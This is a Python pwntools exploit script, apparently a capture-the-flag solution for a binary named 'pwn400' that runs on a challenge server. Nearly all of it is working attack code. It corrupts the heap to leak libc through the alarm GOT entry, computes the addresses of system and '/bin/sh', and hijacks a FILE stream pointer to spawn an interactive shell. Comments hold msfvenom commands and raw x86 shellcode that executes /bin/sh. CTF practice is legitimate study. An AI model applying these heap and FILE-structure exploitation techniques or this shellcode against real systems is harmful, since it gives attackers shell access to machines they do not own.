#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-27 21:28:47
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import os,time
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./pwn400"
remote_ip = "119.29.87.226"
port =  50004
# rop = roputils.ROP(target)
elf = ELF(target)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)
# libc = ELF[target]
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
#buf =  ""
# buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
# buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
# buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
# buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
# buf += "\xfd\x10\xf9"

# int 0x80 linux x86 0x1c
# buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'

# def exec_fmt(payload):
# 	p = process(target)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	return p.recvuntil(",")[:-1]
# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset

# def send_payload(payload):
# 	sl(payload+"%100000c")
# autofmt = FmtStr(send_payload,offset=offset)

# autofmt.write(free_hook_addr,one_gadget_addr)
# autofmt.execute_writes()



if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)


def add(name,sec):
	ru("7.exit\n==============================\n")
	sl("1")
	ru("\n")
	sd(name)
	ru("\n")
	sd(sec)
def edit(sec):
	ru("7.exit\n==============================\n")
	sl("2")
	ru("\n")
	sd(sec)
def dele():
	ru("7.exit\n==============================\n")
	sl("3")
def show():
	ru("7.exit\n==============================\n")
	sl("4")
def submit(data1,data2):
	ru("7.exit\n==============================\n")
	sl("5")
	ru("\n")
	sd("Y")
	ru("\n")
	sd(data1)
	ru("\n")
	sd(data2)
def save(size,title,advise):
	ru("7.exit\n==============================\n")
	sl("6")
	ru("\n")
	sl(str(size))
	ru("\n")
	sd(title)
	ru("\n")
	sd(advise)

#save(0x28,"a"*0x28+p64(0x21),"a"*0x18)

add("a"*8+p64(0x21)+"\n","1\n")

dele()
edit(str(0x6020c0).rjust(7,"0")+"\n")
submit("a"*0x17+"\x00\n","a"*0x8+p64(elf.got["alarm"])+"\n")
##leak (- limit :(
ru("7.exit\n==============================\n")
sl("9")

alarm_addr = u64(ru(",You")[5:-4].ljust(8,"\x00"))
libc_base = alarm_addr-libc.symbols["alarm"]
one_gadget = libc_base + 0xf5e40
bin_sh = libc_base+next(libc.search('/bin/sh'))
system_addr = libc_base+libc.symbols["system"]


##hijack fsp
save(0x100,"a"*0x28+p64(0x110+0x231+0x1010),"aaa\n")
ru("te on ")
addr_1 = int(ru(")\n")[2:-2],16)

#gdb.attach(p,"b*0x040111A\nc")
payload  = 0x1c*p64(system_addr)
payload +="/\x80||/////bin/sh\x00" #start fsp
payload +=0x16*p64(addr_1)+p64(0)+(0x47-0x19)*p64(addr_1)+p64(addr_1)+"\n"

save(0x380,p64(system_addr)*4+"\n",payload)




p.interactive()
